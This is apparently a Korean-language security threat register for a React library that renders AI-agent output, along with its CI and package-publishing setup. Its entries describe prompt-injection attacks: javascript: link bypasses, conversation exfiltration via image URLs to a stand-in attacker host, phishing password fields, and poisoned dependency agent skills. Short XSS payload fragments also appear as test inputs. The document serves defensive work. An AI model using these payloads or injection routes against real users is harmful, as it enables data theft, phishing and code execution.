## 항목

### SEC-1.1. Text 링크 프로토콜 우회

- 위험: 에이전트가 보낸 `[x](javascript:...)`가 링크가 되면 클릭 시 스크립트가 실행된다. 문자열 앞부분만 비교하면 `JaVaScRiPt:`, 앞 공백, 중간 탭 같은 변형으로 우회된다.
- 피해: 치명(코드 실행)
- 필요 조건: 1개(프롬프트 인젝션)
- 근거: React 19가 `href`의 `javascript:` URL을 `javascript:throw new Error('React has blocked a javascript: URL …')`로 바꾼다. 검증된 방어로 인정한다.
  - 확인 방법: `react@19.3.1`, `react-dom@19.3.1`의 클라이언트(`createRoot`, jsdom)와 서버(`renderToString`) 렌더에서 변형 5개(`javascript:`, `JaVaScRiPt:`, 앞 공백, 중간 탭, 앞 제어 문자)가 전부 차단된다.
  - 유지 조건: `moa`의 React peer 범위가 `^19`인 동안 유효하다. MOA-2.7의 `react blocks javascript: href`가 회귀 테스트로 지킨다. 이 테스트가 실패하면 🟡로 되돌린다.
- 대책의 성격: 아래 프로토콜 판정은 이중 방어다.
- 대책: `new URL(href).protocol`이 `http:`, `https:`, `mailto:`일 때만 링크로 만든다. 파싱에 실패하면 평문으로 둔다. Node 20의 `new URL`은 대소문자 섞기, 앞 공백, 앞 제어 문자, 중간 탭·개행 변형을 모두 `javascript:`로 판정한다(2026-11-14 확인). 상대 경로(`/a`, `//host`)는 파싱에 실패해 평문이 된다.
- 검증: 테스트 `does not linkify javascript: urls`, `blocks scheme bypasses`

### SEC-1.2. Text 파서 처리 시간

- 위험: 에이전트 텍스트는 스트리밍 중 계속 다시 파싱된다. 닫히지 않은 `**`나 `[`가 긴 입력에 섞이면 정규식 역추적으로 느려질 수 있다.
- 피해: 경미(성능 저하)
- 필요 조건: 없음(긴 입력만 있으면 된다)
- 근거: 부정 문자 클래스(`[^*]+`)를 쓰면 지수 시간 역추적은 생기지 않고, 제곱 시간 수준만 남는다.
- 대책: 정규식은 유지하고 수량자를 중첩하지 않는다. 경미 등급이라 시간 측정 테스트는 두지 않는다(CI에서 불안정하다).

### SEC-1.3. Image·링크 URL을 통한 데이터 유출

- 위험: 에이전트가 `https://attacker.example/?q=<대화 내용>` 같은 URL을 Image에 넣으면, 사용자가 아무것도 누르지 않아도 브라우저가 요청을 보낸다. LLM 채팅 UI에서 알려진 유출 경로다. Text 링크도 같은 방식이지만 클릭이 필요하다.
- 피해: 제한(대화 일부 노출)
- 필요 조건: 1개(프롬프트 인젝션)
- 근거: 유출은 https URL로 일어나므로 프로토콜 제한으로는 막지 못한다. `referrerPolicy="no-referrer"`도 페이지 주소만 숨긴다.
- 대책: 프레젠테이션 부품인 `moa`에서는 막지 않는다. `packages/moa/README.md`의 "보안" 절에 위험과 대책(CSP `img-src`, 출처 허용 목록)을 적는다. 출처 허용 hook은 `moa-render`(DOC-7에서 설계)에 둔다.

### SEC-1.4. public 레포 CI 권한

- 위험: 누구나 fork해서 PR을 열 수 있다. 워크플로 권한이 넓거나 `pull_request_target`을 쓰면 외부 코드가 쓰기 권한이나 secret을 얻는다. 태그로 지정한 action은 태그가 옮겨지면 다른 코드가 된다.
- 피해: 치명(쓰기 권한 탈취, 비밀값 유출)
- 필요 조건: 1개(워크플로 설정 실수)
- 대책:
  - 트리거는 `push`, `pull_request`만 쓴다.
  - 최상위 `permissions: contents: read`
  - action은 commit SHA로 고정한다.
  - fork PR에는 secret이 없으므로 `chromatic` job에 같은 레포 PR일 때만 실행하는 조건을 둔다.
  - 의존성 install 스크립트는 pnpm 기본값대로 막고, 필요한 패키지만 `pnpm-workspace.yaml`의 `allowBuilds`에 넣는다. pnpm 12.18은 허용되지 않은 빌드 스크립트가 있으면 `ERR_PNPM_IGNORED_BUILDS`로 설치를 실패시키고, `onlyBuiltDependencies`는 반영하지 않는다. 플랜 의존성 중 빌드 스크립트가 있는 `esbuild`, `@parcel/watcher`는 스크립트 없이 동작하므로 `false`로 명시한다(2026-11-14 확인).
- 레포 설정(2026-11-14 적용):
  - 외부 기여자의 워크플로는 모두 승인 후 실행된다(`approval_policy: all_external_contributors`).
  - 워크플로 기본 권한은 읽기 전용이고, 워크플로가 PR을 승인할 수 없다.
  - action은 SHA로 고정해야 실행된다(`sha_pinning_required`).
  - ruleset "main 보호": main의 강제 push와 삭제를 막는다. PR 필수와 상태 검사 필수는 넣지 않는다. DOC-4에 따라 상태 갱신 커밋을 main에 직접 넣기 때문이다.
  - Environment 보호는 secret이 처음 들어오는 MOA-5.6에서 만든다.

### SEC-1.5. npm 배포 인증

- 위험: npm 로그인 토큰이 새면 악성 버전이 배포될 수 있다.
- 피해: 치명(패키지 변조)
- 필요 조건: 2개(토큰 유출, OTP 탈취). 2FA가 쓰기에도 걸려 있어 배포에 OTP가 필요하다.
- 결정: 기존 방식대로 로컬에서 사용자가 직접 배포하고, npm 계정 2FA를 쓴다. CI 배포와 레포 secret의 `NPM_TOKEN`은 쓰지 않는다. 배포는 사용자 승인 후에만 한다.
- 근거: 2026-11-14 `npm profile get`에서 계정 `dusunax`의 2FA 모드가 `auth-and-writes`다.
- 유지 조건: 2FA 모드를 바꾸거나, 2FA를 우회하는 토큰(granular access token의 bypass 옵션 등)을 만들면 🟡로 되돌린다.

### SEC-1.6. Storybook 빌드 환경 변수 노출

- 위험: Vite 빌더는 `STORYBOOK_*`, `VITE_*` 환경 변수를 빌드 결과물에 문자열로 넣는다. 결과물은 Chromatic에 공개된다.
- 피해: 치명(비밀값 유출)
- 필요 조건: 1개(비밀값을 해당 변수에 넣는 설정 실수). 현재 쓰는 변수는 MOA-6의 `STORYBOOK_LOCALE`뿐이다.
- 대책:
  - 규칙: 두 접두사 변수에는 토큰이나 키를 넣지 않는다(DOC-6 Global Constraints).
  - 강제: `packages/storybook/scripts/check-public-env.mjs`가 `predev`·`prebuild`에서 허용 목록(`STORYBOOK_LOCALE`) 밖의 두 접두사 변수를 찾으면 빌드를 멈춘다. CI와 Chromatic 빌드도 같은 `build`를 쓰므로 함께 막힌다.
  - 허용 목록에 변수를 추가할 때는 그 값이 공개돼도 되는지 확인한다.
- 근거: MOA-1.18a에서 `STORYBOOK_API_TOKEN`을 넣고 빌드하면 "허용 목록에 없는 공개 환경 변수: STORYBOOK_API_TOKEN"을 출력하고 exit 1로 멈춘다. 값은 출력되지 않는다(2026-11-14 확인). 검증된 방어로 인정한다.
- 유지 조건: `predev`·`prebuild` 연결과 허용 목록을 유지한다. 검사를 거치지 않는 빌드 경로를 만들면 🟡로 되돌린다.

### SEC-1.7. 에이전트가 그리는 민감 부품

- 위험: 에이전트가 화면을 구성하므로, 인젝션을 당하면 `obscured` TextField(`type="password"`)로 비밀번호를 묻거나 Modal로 시스템 대화상자를 흉내 낼 수 있다.
- 피해: 제한(피싱)
- 필요 조건: 1개(프롬프트 인젝션). 사용자가 입력하는 행동은 세지 않는다.
- 대책(SEC-3): `moa-render`에서 `obscured` TextField와 Modal 같은 민감 부품은 기본으로 그리지 않고, 쓰는 쪽이 명시적으로 허용해야 그린다. action도 허용 목록으로 검증한 뒤 에이전트에게 돌려보낸다.

### SEC-1.8. 의존성 범위 저장과 갓 나온 버전

- 위험: 플랜에 정확한 버전을 적어도 `pnpm add`는 기본으로 `^` 범위를 저장한다. 의존성을 갱신할 때 오염된 새 버전이 들어올 수 있다.
- 피해: 치명(패키지 변조)
- 필요 조건: 2개(상위 패키지 오염, 그 버전이 3일 동안 발견·회수되지 않음). 갱신 명령은 정상 사용이라 세지 않는다.
- 대책: `pnpm-workspace.yaml`에 `saveExact: true`와 `minimumReleaseAge: 4320`을 둔다. pnpm 12.18은 `.npmrc`의 `save-exact=true`를 무시하고 `^` 범위로 저장하며, `saveExact: true`일 때만 정확한 버전으로 저장한다(2026-11-14 확인).
- 근거: pnpm 12.18에서 `minimumReleaseAge: 4320`을 두면 3일 미만인 고정 버전(`jsdom@31.0.1`)은 설치가 실패하고, 버전을 지정하지 않으면 3일 이상 지난 버전(`31.0.0`)을 고른다(2026-11-14 확인). 오염된 버전은 보통 며칠 안에 발견되므로 검증된 방어로 인정한다.
- 유지 조건: `minimumReleaseAgeExclude`에 패키지를 넣으면 그 패키지는 🟡로 본다.

### SEC-1.9. 의존성이 들고 오는 에이전트 스킬

- 위험: pnpm 12는 패키지에 들어 있는 에이전트 스킬을 설치 대상으로 보여 준다(`Agent skills awaiting approval: tsdown`). 승인하면 코딩 에이전트가 그 지시를 읽고 따를 수 있다. 패키지가 오염되면 에이전트에게 명령을 실행시키는 경로가 된다.
- 피해: 치명(코드 실행)
- 필요 조건: 2개(상위 패키지 오염, 운영자의 스킬 승인). 승인은 기본으로 꺼져 있다(2026-11-14 확인).
- 대책: 의존성의 에이전트 스킬은 승인하지 않는다(`pnpm approve` 금지, MOA-1.2).

### SEC-1.10. playground API 키 노출

- 위험: playground가 브라우저에서 OpenRouter를 직접 부르면 API 키가 번들이나 네트워크 요청에 그대로 보인다. 공개 배포하면 누구나 키를 가져갈 수 있다.
- 피해: 치명(비밀값 유출)
- 필요 조건: 1개(키를 클라이언트 코드나 `VITE_*` 변수에 넣는 설계 실수)
- 대책(SEC-3): 키는 서버(또는 서버리스 함수)에만 두고, 브라우저는 그 서버를 거쳐 호출한다. `:free` 모델만 쓰더라도 키 유출은 계정 남용으로 이어지므로 같은 기준을 적용한다.

## 문제없다고 본 것

- **Icon `svgPath`**: React가 `d` 속성값을 이스케이프한다. `"/><script>…`를 넣어도 속성 밖으로 나가지 않는다(2026-11-14 `renderToString` 확인).
- **ToolCallCard `args`, `result`**: `<pre>` 안의 텍스트로 렌더링하고 React가 이스케이프한다. `</pre><img onerror=…>`도 텍스트로 남는다(2026-11-14 확인). `JSON.parse` 실패는 원문 표시로 처리한다.
- **Text HTML**: HTML을 렌더링하지 않는다. 테스트 `never renders raw HTML`
- **링크 `target="_blank"`**: `rel="noopener noreferrer"`가 있다.
- **배포 파일 범위**: `files: ["dist"]` 허용 목록이라 `src/`, `.env` 같은 파일이 패키지에 들어가지 않는다.
- **기존 히스토리**: 전체 커밋 4개에 `.env`, `.npmrc`, 키·토큰 파일과 비밀값 패턴이 없다. `legacy/multi-touch` 태그를 공개해도 된다.
- **`.gitignore`**: `.env*`가 이미 있어 로컬 Chromatic 토큰을 `.env`에 둬도 커밋되지 않는다.
